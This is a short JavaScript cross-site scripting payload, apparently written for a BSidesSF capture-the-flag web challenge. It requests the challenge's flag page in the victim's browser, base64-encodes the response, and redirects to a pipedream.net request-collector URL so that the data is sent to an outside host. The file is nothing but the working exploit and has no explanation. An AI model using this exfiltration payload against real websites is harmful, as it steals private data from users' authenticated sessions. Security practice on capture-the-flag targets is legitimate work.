var xhr = new XMLHttpRequest();
xhr.open('GET','https://web-tutorial-2-3ebcc611.challenges.bsidessf.net/xss-two-flag',true);
xhr.send();
xhr.onload = function() {

	window.location="https://eoalqdv1yrob2tu.m.pipedream.net/?a="+btoa(xhr.response);
  
};
